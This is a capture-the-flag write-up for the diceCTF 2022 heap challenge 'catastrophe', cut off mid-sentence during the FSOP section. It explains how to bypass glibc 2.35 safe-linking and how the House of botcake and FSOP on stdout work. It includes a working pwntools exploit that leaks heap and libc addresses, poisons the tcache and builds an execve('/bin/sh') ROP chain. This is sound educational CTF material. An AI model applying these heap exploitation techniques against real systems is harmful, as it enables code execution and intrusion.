description = "Introduction I just learned how to use malloc and free… am I doing this right?  catastrophe is a heap challenge I did during the diceCTF 2022. I did have a lot of issues with the libc and the dynamic"
full_description = '''[diceCTF 2022 - pwn] catastrophe 2022-07-28 pwn 3.8k words 2022FSOPaaSSfxxxctfdiceCTFheapnasmpwnret2school Introduction I just learned how to use malloc and free… am I doing this right? catastrophe is a heap challenge I did during the diceCTF 2022. I did have a lot of issues with the libc and the dynamic linker, thus I did a first time the challenge with the libc that was in /lib/libc.so.6, then I figured out thanks to my teammate supersnail that I was using the wrong libc. Then I did it again with the right libc but the dynamic linker was (again) wrong and I lost a loot of time on it. So well, the challenge wasn’t pretty hard but I took a funny way to solve it because I thought the libc had FULL RELRO while it had only PARTIAL RELRO. Find the exploit and the tasks right here. TL; DR Leak heap address + defeating safe linking by printing the first free’d chunk in the tcache. House of botcake to create overlapping chunks and get arbitrary write FSOP on stdout to leak environ and then ROP over the stack. What we havecatastrophe is a classic heap challenge here are the classic informations about it: 123456789101112131415161718192021222324$ ./libc.so.6 GNU C Library (Ubuntu GLIBC 2.35-0ubuntu3) stable release version 2.35.Copyright (C) 2022 Free Software Foundation, Inc.This is free software; see the source for copying conditions.There is NO warranty; not even for MERCHANTABILITY or FITNESS FOR APARTICULAR PURPOSE.Compiled by GNU CC version 11.2.0.libc ABIs: UNIQUE IFUNC ABSOLUTEFor bug reporting instructions, please see:<https://bugs.launchpad.net/ubuntu/+source/glibc/+bugs>.$ checksec --file libc.so.6 [*] '/home/nasm/Documents/ctf/2022/diceCTF/pwn/catastrophe/libc.so.6' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled$ checksec --file catastrophe [*] '/home/nasm/Documents/ctf/2022/diceCTF/pwn/catastrophe/catastrophe' Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled 2.35 libc, which means there is no more classic hooks like __malloc_hook or __free_hook. The binary allows to: malloc up to 0x200 bytes and read data in it with the use of fgets Allocate from the index 0 to 9 free anything given the index is between 0 and 9 Thus we can easily do a House of botcake but first of all we have to defeat the safe linking to properly getting an arbitrary write. Defeat safe-linkingSince 2.32 is introduced in the libc the safe-linking mechanism that does some xor encyptions on tcache, fastbin next fp to prevent pointer hiijacking. Here is the core of the mechanism: 12345678910111213// https://elixir.bootlin.com/glibc/latest/source/malloc/malloc.c#L340/* Safe-Linking: Use randomness from ASLR (mmap_base) to protect single-linked lists of Fast-Bins and TCache. That is, mask the "next" pointers of the lists' chunks, and also perform allocation alignment checks on them. This mechanism reduces the risk of pointer hijacking, as was done with Safe-Unlinking in the double-linked lists of Small-Bins. It assumes a minimum page size of 4096 bytes (12 bits). Systems with larger pages provide less entropy, although the pointer mangling still works. */#define PROTECT_PTR(pos, ptr) \ ((__typeof (ptr)) ((((size_t) pos) >> 12) ^ ((size_t) ptr)))#define REVEAL_PTR(ptr) PROTECT_PTR (&ptr, ptr) Since for this challenge we’re focused on tcache, here is how a chunk is free’d using safe-linking: 12345678910111213141516// https://elixir.bootlin.com/glibc/latest/source/malloc/malloc.c#L3175/* Caller must ensure that we know tc_idx is valid and there's room for more chunks. */static __always_inline voidtcache_put (mchunkptr chunk, size_t tc_idx){ tcache_entry *e = (tcache_entry *) chunk2mem (chunk); /* Mark this chunk as "in the tcache" so the test in _int_free will detect a double free. */ e->key = tcache_key; e->next = PROTECT_PTR (&e->next, tcache->entries[tc_idx]); tcache->entries[tc_idx] = e; ++(tcache->counts[tc_idx]);} Thus, the first time a chunk is inserted into a tcache list, e->next is initialized to &e->next >> 12 (heap base address) xor tcache->entries[tc_idx] which is equal to zero when the list for a given size is empty. Which means to leak the heap address we simply have to print a free’d chunk once it has been inserted in the tcache. House of botcakeThe House of botcake gives a write what where primitive by poisoning the tcache. The algorithm is: Allocate 7 0x100 sized chunks to then fill the tcache (7 entries). Allocate two more 0x100 sized chunks (prev and a in the example). Allocate a small “barrier” 0x10 sized chunk. Fill the tcache by freeing the first 7 chunks. free(a), thus a falls into the unsortedbin. free(prev), thus prev is consolidated with a to create a large 0x221 sized chunk that is yet in the unsortedbin. Request one more 0x100 sized chunk to let a single entry left in the tcache. free(a) again, given a is part of the large 0x221 sized chunk it leads to an UAF. Thus a falls into the tcache. That’s finished, to get a write what where we just need to request a 0x130 sized chunk. Thus we can hiijack the next fp of a that is currently referenced by the tcache by the location we wanna write to. And next time two 0x100 sized chunks are requested, the second one will be the target location. Getting arbitrary writeTo make use of the write what were we got thanks to the House of botcake, we need to get both heap and libc leak. To leak libc that’s pretty easily we just need to print out a free’d chunk stored into the unsortedbin, it’s forward pointer is not encrypted with safe-linking. As seen previously, to bypass safe-linking we have to print a free’d chunk once it has been inserted in the tcache. It would give us the base address of the heap. When we got it, we just have to initialize the location we wanna write to location ^ ((heap_base + chunk_offset) >> 12) to encrypt properly the pointer, this way the primitive is efficient. Implmentation of the House of botcake + safe-linking bypass, heap and libc leak: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108io = start()def alloc(idx, data, size): io.sendlineafter("-\n> ", b"1") io.sendlineafter("Index?\n> ", str(idx).encode()) io.sendlineafter("> ", str(size).encode()) io.sendlineafter(": ", data) def free(idx): io.sendlineafter("> ", b"2") io.sendlineafter("> ", str(idx).encode())def view(idx): io.sendlineafter("> ", b"3") io.sendlineafter("> ", str(idx).encode())for i in range(7): alloc(i, b"", 0x100)free(0)view(0)heap = ((pwn.u64(io.recvline()[:-1].ljust(8, b"\x00")) << 12))pwn.log.info(f"heap @ {hex(heap)}")# then we defeated safe linking lolalloc(0, b"YY", 0x100)# request back the chunk we used to leak the heapalloc(7, b"YY", 0x100) # prevalloc(8, b"YY", 0x100) # aalloc(9, b"/bin/sh\0", 0x10) # barrier# fill tcachefor i in range(7): free(i)free(8) # free(a) => unsortedbinfree(7) # free(prev) => merged with a# leak libcview(8)libc = pwn.u64(io.recvline()[:-1].ljust(8, b"\x00")) - 0x219ce0 # - 0x1bebe0 # offset of the unsorted binrop = pwn.ROP(libc)binsh = next(libc.search(b"/bin/sh\x00"))rop.execve(binsh, 0, 0)environ = libc.address + 0x221200stdout = libc.address + 0x21a780pwn.log.info(f"libc: {hex(libc)}")pwn.log.info(f"environ: {hex(environ)}")pwn.log.info(f"stdout: {hex(stdout)}")alloc(0, b"YY", 0x100) # pop a chunk from the tcache to let an entry left to a free(8) # free(a) => tcachealloc(1, b"T"*0x108 + pwn.p64(0x111) + pwn.p64((stdout ^ ((heap + 0xb20) >> 12))), 0x130) # 0x130, too big for tcache => unsortedbin UAF on a to replace a->next with the address of the target location (stdout) alloc(2, b"TT", 0x100)# pop a from tcache# next 0x100 request will return the target location (stdout)"""0x55c4fbcd7a00: 0x0000000000000000 0x0000000000000141 [prev]0x55c4fbcd7a10: 0x5454545454545454 0x54545454545454540x55c4fbcd7a20: 0x5454545454545454 0x54545454545454540x55c4fbcd7a30: 0x5454545454545454 0x54545454545454540x55c4fbcd7a40: 0x5454545454545454 0x54545454545454540x55c4fbcd7a50: 0x5454545454545454 0x54545454545454540x55c4fbcd7a60: 0x5454545454545454 0x54545454545454540x55c4fbcd7a70: 0x5454545454545454 0x54545454545454540x55c4fbcd7a80: 0x5454545454545454 0x54545454545454540x55c4fbcd7a90: 0x5454545454545454 0x54545454545454540x55c4fbcd7aa0: 0x5454545454545454 0x54545454545454540x55c4fbcd7ab0: 0x5454545454545454 0x54545454545454540x55c4fbcd7ac0: 0x5454545454545454 0x54545454545454540x55c4fbcd7ad0: 0x5454545454545454 0x54545454545454540x55c4fbcd7ae0: 0x5454545454545454 0x54545454545454540x55c4fbcd7af0: 0x5454545454545454 0x54545454545454540x55c4fbcd7b00: 0x5454545454545454 0x54545454545454540x55c4fbcd7b10: 0x5454545454545454 0x0000000000000111 [a]0x55c4fbcd7b20: 0x00007f5d45ff5b57 0x4f60331b73b9000a0x55c4fbcd7b30: 0x0000000000000000 0x00000000000000000x55c4fbcd7b40: 0x0000000000000000 0x00000000000000e1 [unsortedbin]0x55c4fbcd7b50: 0x00007f5819b0dce0 0x00007f5819b0dce00x55c4fbcd7b60: 0x0000000000000000 0x00000000000000000x55c4fbcd7b70: 0x0000000000000000 0x00000000000000000x55c4fbcd7b80: 0x0000000000000000 0x00000000000000000x55c4fbcd7b90: 0x0000000000000000 0x00000000000000000x55c4fbcd7ba0: 0x0000000000000000 0x00000000000000000x55c4fbcd7bb0: 0x0000000000000000 0x00000000000000000x55c4fbcd7bc0: 0x0000000000000000 0x00000000000000000x55c4fbcd7bd0: 0x0000000000000000 0x00000000000000000x55c4fbcd7be0: 0x0000000000000000 0x00000000000000000x55c4fbcd7bf0: 0x0000000000000000 0x00000000000000000x55c4fbcd7c00: 0x0000000000000000 0x00000000000000000x55c4fbcd7c10: 0x0000000000000000 0x00000000000000000x55c4fbcd7c20: 0x00000000000000e0 0x00000000000000200x55c4fbcd7c30: 0x0068732f6e69622f 0x000000000000000a0x55c4fbcd7c40: 0x0000000000000000 0x00000000000203c1 [top chunk]""" FSOP on stdout to leak environI didn’t see first that only PARTIAL RELRO was enabled on the libc, so the technique I show you here was thought to face a 2.35 libc with FULL RELRO enabled that the reason why I didn’t just hiijack some GOT pointers within the libc. A pretty convenient way to gain code execution when the hooks (__malloc_hook, __free_hook) are not present (since 2.32 cf this for 2.34) is to leak the address of the stack to then write a ROPchain on it. To leak a stack address we can make use of the environ symbol stored in the dynamic linker, it contains a pointer toward **envp. To read this pointer we need a read what where primitive! Which can be achieved through a file stream oriented programming (FSOP) attack on stdout for example. To dig more FSOP I advise you to read this write-up as well as this one. To understand the whole process I’ll try to introduce you to FSOP. First of all the target structure is stdout, we wanna corrupt stdout because it’s used ritght after the fgets that reads the input from the user by the putchar function. Basically on linux “everything is a file” from the character device the any stream (error, input, output, opened file) we can interact with a resource just by opening it and by getting a file descriptor on it, right ? This way each file descripor has an associated structure called FILE you may have used if you have already done some stuff with files on linux. Here is its definition: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455// https://elixir.bootlin.com/glibc/latest/source/libio/bits/types/struct_FILE.h#L49/* The tag name of this struct is _IO_FILE to preserve historic C++ mangled names for functions taking FILE* arguments. That name should not be used in new code. */struct _IO_FILE{ int _flags; /* High-order word is _IO_MAGIC; rest is flags. */ /* The following pointers correspond to the C++ streambuf protocol. */ char *_IO_read_ptr; /* Current read pointer */ char *_IO_read_end; /* End of get area. */ char *_IO_read_base; /* Start of putback+get area. */ char *_IO_write_base; /* Start of put area. */ char *_IO_write_ptr; /* Current put pointer. */ char *_IO_write_end; /* End of put area. */ char *_IO_buf_base; /* Start of reserve area. */ char *_IO_buf_end; /* End of reserve area. */ /* The following fields are used to support backing up and undo. */ char *_IO_save_base; /* Pointer to start of non-current get area. */ char *_IO_backup_base; /* Pointer to first valid character of backup area */ char *_IO_save_end; /* Pointer to end of non-current get area. */ struct _IO_marker *_markers; struct _IO_FILE *_chain; int _fileno; int _flags2; __off_t _old_offset; /* This used to be _offset but it's too small. */ /* 1+column number of pbase(); 0 is unknown. */ unsigned short _cur_column; signed char _vtable_offset; char _shortbuf[1]; _IO_lock_t *_lock;#ifdef _IO_USE_OLD_IO_FILE};struct _IO_FILE_complete{ struct _IO_FILE _file;#endif __off64_t _offset; /* Wide character stream stuff. */ struct _IO_codecvt *_codecvt; struct _IO_wide_data *_wide_data; struct _IO_FILE *_freeres_list; void *_freeres_buf; size_t __pad5; int _mode; /* Make sure we don't get into trouble again. */ char _unused2[15 * sizeof (int) - 4 * sizeof (void *) - sizeof (size_t)];}; Here are brievly role of each fields: _flags stands for the behaviour of the stream when a file operation occurs. _IO_read_ptr address of input within the input buffer that has been already used. _IO_read_end end address of the input buffer. _IO_read_base base address of the input buffer. _IO_write_base base address of the ouput buffer. _IO_write_ptr points to the character that hasn’t been printed yet. _IO_write_end end address of the output buffer. _IO_buf_base base address for both input and output buffer. _IO_buf_end end address for both input and output buffer. _chain stands for the single linked list that links of all file streams. _fileno stands for the file descriptor associated to the file. _vtable_offset stands for the offset of the vtable we have to use. _offset stands for the current offset within the file. Relatable flags: _IO_USER_BUF During line buffered output, _IO_write_base==base() && epptr()==base(). However, ptr() may be anywhere between base() and ebuf(). This forces a call to filebuf::overflow(int C) on every put. If there is more space in the buffer, and C is not a ‘\n’, then C is inserted, and pptr() incremented. _IO_MAGIC Magic number of fp->_flags. _IO_UNBUFFERED If a filebuf is unbuffered(), the _shortbuf[1] is used as the buffer. _IO_LINKED In the list of all open files. To understand I advise you to read this great article about FILE structures. What we gonna do right now is trying to understand the use of stdout during within the putchar function. And we will try to find a code path that will not write the provided argument (in this case the \n taken by putchar) into the output buffer we control but rather flush the file stream to directly print its content and then print the provided argument. This way we could get an arbitrary read by controlling the output buffer.Let’s take a closer look at th'''
